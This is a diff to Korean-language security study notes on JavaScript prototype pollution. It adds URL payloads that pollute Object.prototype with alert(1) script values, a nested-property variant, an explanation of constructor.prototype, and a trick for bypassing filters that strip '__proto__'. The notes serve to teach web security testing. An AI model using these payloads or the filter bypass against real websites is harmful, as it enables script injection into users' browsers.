@@ -199,6 +199,8 @@ URL Query에서 URL 파서가 해당 Query를 파싱하여 임의의 문자열�
 https://vulnerable-website.com/?__proto__[evilProperty]=payload
 '''
 https://vulnerable-website.com/?__proto__[innerHTML]=<img/src/onerror%3dalert(1)>
+'''
+https://vulnerable-website.com/?__proto__[evilProperty]=data:,alert(1);
 ```
 
 ## JSON형식의 입력값
@@ -218,6 +220,8 @@ https://vulnerable-website.com/?__proto__{"innerHTML": "<img/src/onerror%3dalert
 vulnerable-website.com/?__proto__[foo]=bar
 OR
 vulnerable-website.com/?__proto__.foo=bar
+OR
+vulnerable-website.com/?__proto__[foo1][foo2]=bar
 '''
 Object.prototype.foo
 // "bar" indicates that you have successfully polluted the prototype
@@ -230,7 +234,27 @@ Object.prototype.foo
 
 # constructor를 통한 Prototype pollution
 
+Javascript에서는 함수 또한 내부적으로 보면, 하나의 Object이다. 이 때 각각의 생성자 함수에는 해당 생성자에 의해 생성되는 모든 객체에 할당될 프로토타입을 가리키는 속성이 존재한다.
+
+<div class="notice">
+myObject.constructor.prototype        // Object.prototype
+myString.constructor.prototype        // String.prototype
+myArray.constructor.prototype         // Array.prototype
+</div>
+
+예를 들어, myObject.constructor.prototype 는 myBoject.__proto__ 와 동일하다고 볼 수 있다.
+
+# Bypass 
+
+1. URL 뒤 파라미터로 나오는 "__proto__" 문자열을 제거하는 로직이 존재할 경우 앞 뒤로 문자를 추가함으로써 이를 우회할 수 있다.
+
+```
+test/?__pro__proto__to__.bar=foo
+```
+
+
 # Referance
 1. https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/Object_prototypes
 2. https://hackyboiz.github.io/2021/10/30/l0ch/2021-10-30/
 3. https://www.hahwul.com/cullinan/prototype-pollution/#attack-vector
+4. https://portswigger.net/web-security/learning-paths/prototype-pollution/
